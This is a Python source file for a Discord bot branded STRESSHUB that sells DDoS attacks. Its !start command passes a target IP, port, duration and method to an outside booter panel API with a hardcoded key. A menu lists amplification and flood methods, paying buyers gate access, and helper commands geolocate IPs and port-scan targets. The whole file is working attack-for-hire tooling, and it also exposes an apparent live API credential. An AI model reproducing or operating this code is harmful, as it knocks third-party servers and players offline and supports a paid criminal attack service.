#MADE BY PHANTOM SERVICES
import discord
import os
import asyncio
import aiohttp
import json
from discord.ext import commands
from discord import File
import string
import io
import requests
import math
client = commands.Bot(command_prefix='!',case_insensitive=True)
TOKEN=('')#<------------------- your bot token!

client.remove_command('help')

buyers  = [897946536779063398, 2, 3] 
admins  = [897946536779063398, 2, 3]              
ownerList  = [897946536779063398, 2, 3]

#ARG1 = IP
#ARG2 = PORT
#ARG3 = TIME
#ARG4 = METHOD

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name='STRESSHUB'))
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print(discord.__version__)
    print('------')

    print('Servers connected to:')
    for guild in client.guilds:
       # await guild.leave()
        print(guild.name)
        print ('--------')

@client.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="You're not an Admin! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} is already a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.append(buyer)
        embed = discord.Embed(title="Buyer Added", description=f"{buyer} has been added to the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete a buyer from the buyers list
@client.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="You're not an Admin! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer not in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} is not a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.remove(buyer)
        embed = discord.Embed(title="Buyer Removed", description=f"{buyer} has been removed from the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#add an admin to the admins list
@client.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="You're not an owner! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin in admins:
        embed = discord.Embed(title="Administrator Error", description=f"{admin} is already an Admin!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin is None:
        embed = discord.Embed(title="Administrator Error", description=f"Please provide an Admins ID", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        admins.append(admin)
        embed = discord.Embed(title="Administrator Added", description=f"{admin} has been added to the Admin list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete an admin from the admins list
@client.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="You're not an owner! L", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin not in admins:
	    embed = discord.Embed(title="Invalid ID", description="This ID doesn't belong to an existing Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    elif admin is None:
	    embed = discord.Embed(title="Invalid ID", description="Please provide an ID of a *current* Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    else:
        admins.remove(admin)
        embed = discord.Embed(title="Administrator Removed", description=f"{admin} has been removed...", color=0xa30000)
        await ctx.send(embed=embed)      
        
@client.command(name='whois')
async def whois(ctx, arg1):
   if arg1 == "":
       await ctx.send("provide a arguement!")
   else:
       async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{arg1}?fields=66846719") as r:
                    js = await r.json()
                    myip = ('')
                    if myip == (js["query"]):
                        await ctx.send('invalid ip!')
                    else:
                        cont = (js["continent"])
                        country = (js["country"])
                        region = (js["regionName"])
                        city = (js["city"])
                        zipcode = (js["zip"])
                        iso = (js["isp"])
                        org = (js["org"])
                        reverse = (js["reverse"])
                        mobile = (js["mobile"])
                        proxy = (js["proxy"])
                        hosting = (js["hosting"])
                        embed1 = discord.Embed(title=(js["query"]), color=discord.Color.from_rgb(255, 153, 0))
                        embed1.add_field(name="info", value=(f"{ctx.author.mention} \n"
                                                                         f"continent: {cont} \n \n "
                                                                         f"country: {country} \n \n "
                                                                         f"region: {region}\n \n "
                                                                         f"city: {city} \n \n"
                                                                         f"zip: {zipcode} \n \n"
                                                                         f"isp: {iso} \n \n"
                                                                         f"org: {org} \n \n"
                                                                         f"reverse: {reverse} \n \n"
                                                                         f"mobile: {mobile} \n \n"
                                                                         f"proxy: {proxy} \n \n"
                                                                         f"hosting: {hosting}"), inline=False)
                        await ctx.send(embed=embed1)
                        
       
@client.command(name='portscan')
async def portscan(ctx, arg1):
    if arg1 == 'myipwashere!':
     await ctx.send("invalid ip!")
    else:
       async with aiohttp.ClientSession() as session:
                async with session.get(f"https://api.hackertarget.com/nmap/?q={arg1}") as r:
                       if r.status == 200:
                        text = await r.text()
                        embed1 = discord.Embed(title=(f'results from {arg1}'), description=(text), color=discord.Color.from_rgb(0, 191, 255))
                        await ctx.send(embed=embed1)
                       else:
                           erroremb = discord.Embed(title="There was an error!",
                                                    description="The api is likely down, contact owner",
                                                    colour=discord.Colour.red())
                           await ctx.send(embed=erroremb)


@client.command(name='help')
async def help(ctx):
    print("test")
    embed1 = discord.Embed(title='Help menu',color = discord.Color.from_rgb(255, 153, 0))
    embed1.add_field(name="\nCommands:\n\n", value=(
                     f"**!start**:\nThe command that starts a ddos attack **[IP,PORT,TIME,METHOD]**\n"
                     f"**!methods**:\nA command that shows ddos methods\n"), inline=True)
    await ctx.send(embed=embed1)
    


@client.command(name='start')
@commands.has_any_role('acess')#<--------------------- the exact role name (same spelling) you want users to have
@commands.cooldown(1, 120, commands.BucketType.user) #<---------- 120 can be replaced for the time you want each user to be on cooldown!
async def hold(ctx, arg1, arg2, arg3:int, arg4):
 try:
     async with aiohttp.ClientSession() as session:
         async with session.get(f"https://narul.pl/panel/api/?host={arg1}&port={arg2}&time={arg3}&method={arg4}&totalservers=1&username=narul&key=wd8wsr4!bpi3wxkz!w2kuy8dmzqr9b7mq!9ovb") as r: #<----------------------- #**MAKE SURE TO INCLUDE YOUR API KEY! {
             b = await r.text()
             print(b)
             message = await ctx.send("**sending.**")
             await asyncio.sleep(2)
             await message.edit(content=f"**sending..**")
             await asyncio.sleep(2)
             await message.edit(content=f"**sending...**")
             await asyncio.sleep(1)
             embed1 = discord.Embed(title=f'attack sent! | stresshub',color=discord.Color.from_rgb(0, 255, 0))
             embed1.add_field(name="~~info~~", value=(f"~~{ctx.author.mention}?~~\n"), inline=False)
             embed1.add_field(name="~~host~~", value=(f"""```py\n{arg1}```"""))
             embed1.add_field(name="~~port~~", value=(f"""```py\n{arg2}```"""))
             embed1.add_field(name="~~time~~", value=(f"""```py\n{arg3}```"""), inline=False)
             embed1.add_field(name="~~method~~", value=(f"""```css\n{arg4}```"""), inline=True)
             embed1.set_thumbnail(url=ctx.guild.icon_url)
             await ctx.send(embed=embed1)          
 except:
     await ctx.send("make sure to put in your api key! (for admins)")
#DO NOT DELETE:
#           "6f/77/6e/65/64/20/62/79/20/70/68/61/6e/74/6f/6d/20/73/65/72/76/69/63/65/73/2e"


@client.command(name='methods')
async def methods(ctx):
    print("mtd")
    embed1 = discord.Embed(title='Methods menu',color = discord.Color.from_rgb(255, 153, 0))
    embed1.add_field(name="\nMethods:\n\n", value=(
                     f"**L4**:\n ``NTP`` ``DNS`` ``CLDAP`` ``XSYN`` ``OVH`` ``UDPMIX`` ``UBNT`` ``Fivem`` ``MINECRAFT`` ``MTA`` ``SAMP`` ``ARK``\n"
                     f"**L7**:\n``BYPASSMIX`` ``ENGINEGET``\n"), inline=True)
    await ctx.send(embed=embed1)


@client.command(name='purge', brief='purges messages in the channel')
@commands.has_permissions(manage_messages=True)
async def clean(ctx, limit: int):
        await ctx.channel.purge(limit=limit)
        embed1 = discord.Embed(title = "purged", description=f"the channel has been purged of {limit} messages by {ctx.author.mention}",color = discord.Color.from_rgb(255,0,0  ))
        await ctx.send(embed=embed1, delete_after=10)
        await ctx.message.delete()


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.MissingRequiredArgument):
        embed = discord.Embed(title="please provide a arguement! you cant leave a field blank, please use help for more context.",color=discord.Color.from_rgb(255, 153, 0))
        await ctx.send(embed=embed)
    if isinstance(error, commands.errors.MissingAnyRole):
        embed = discord.Embed(title="Please contact the owner to purchase a plan to gain access to this command!",color=discord.Color.from_rgb(255, 153, 0))
        await ctx.send(embed=embed)
    if isinstance(error, commands.CommandOnCooldown):
            await ctx.send("This command is on cooldown, please retry in {}s.".format(math.ceil(error.retry_after)))
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title="you need to be a admin to do this!",color=discord.Color.from_rgb(255, 153, 0))
        await ctx.send(embed=embed)

client.run(TOKEN)
